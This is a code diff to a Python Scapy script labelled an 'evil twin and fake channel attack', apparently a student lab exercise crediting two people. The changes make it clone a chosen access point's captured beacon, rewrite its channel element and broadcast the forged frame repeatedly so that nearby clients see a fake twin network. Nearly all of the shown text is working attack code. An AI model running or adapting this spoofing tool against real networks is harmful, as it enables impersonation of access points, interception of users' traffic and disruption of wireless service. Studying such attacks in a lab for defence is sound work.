@@ -9,6 +9,8 @@
 #          - https://stackoverflow.com/questions/56644291/trying-to-retrieve-channel-from-802-11-frame-with-scapy
 #          - https://github.com/Esser420/EvilTwinFramework
 #          - https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
+#          - https://stackoverflow.com/questions/29817417/scapy-insert-packet-layer-between-two-other-layers
+#          - Victor Truan, Edin Mujkanovic
 
 # Evil twin and fake channel attack
 from scapy.all import *
@@ -28,7 +30,7 @@ def packetHandler(pkt):
                 ssid_list.append(pkt)
                 # We print the list of retrieved ssids
                 for i in range(len(ssid_list)):
-                    print(str(i) + ' - ' + str(ssid_list[i].info))
+                    print(str(i) + ' - ' + str(ssid_list[i].info) + ' : ' + str(ssid_list[i].dBm_AntSignal) + 'dBm')
                 print("#-------------------------#")
         except AttributeError as e:
                 print(e)
@@ -50,7 +52,12 @@ try:
 
     print("You choose " + str(target_pkt.info))
 
-    print("Packet Summary " + str(target_pkt.summary()))
+    #print("\nPacket Summary:\n" + str(target_pkt.summary()))
+    #print("\nPacket content:")
+    #target_pkt.show()
+    
+    # We retrieve the end of the packet
+    payload = target_pkt.getlayer(6)
 
     # We retrieve the target channel
     target_channel = target_pkt[Dot11Beacon].network_stats().get("channel")
@@ -58,7 +65,7 @@ try:
 
     # We define a new channel for the beacons
     if(target_channel > 7):
-        new_ch = target_channel -6
+        new_ch = target_channel - 6
     else:
         new_ch = target_channel + 6
 
@@ -66,32 +73,17 @@ try:
 
     os.system(f"iwconfig {interface} channel {new_ch}")
 
-    # We forge a new beacon
-    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=target_pkt.addr2, addr3=target_pkt.addr2)
+    # We forge a new beacon based on the one we captured
+    packet = target_pkt
+    packet[Dot11Elt:3] = Dot11Elt(ID="DSset", info=chr(new_ch))
 
-    beacon = Dot11Beacon(cap='ESS+privacy')
-    essid = Dot11Elt(ID=target_pkt.info,info=target_pkt.info, len=len(target_pkt.info))
-    # rsn = Dot11Elt(ID='RSNinfo', info=)               #RSN Capabilities (no extra capabilities)
-    
-    # frame = RadioTap()/dot11/beacon/essid/rsn
-    #if TCP in target_pkt:
-    #    payload = bytes(target_pkt[TCP].payload)
-    #elif Raw in target_pkt:
-    #    payload = bytes(target_pkt[Raw].load)
-    #elif TLS in p:
-    #    payload = bytes(target_pkt[TLS].msg)
-    #else:
-    #    payload = ""
+    frame = packet/payload
 
-    frame = RadioTap()/dot11/beacon/essid/target_pkt[Dot11EltRSN]
-    
-    print("\nShow frame:")
-    frame.show()
-    #print("\nHexdump of frame:")
-    #hexdump(bytes(frame))
+    #print("\n-------------------------------\nShow frame:")
+    #frame.show()
     input("\nPress enter to send\n")
     
-    send(frame,count=5, iface=interface, inter=0.1, loop=1)
+    sendp(frame,count=100, iface=interface, inter=0.1, loop=1)
     
 except Exception as ex:
     print(ex)
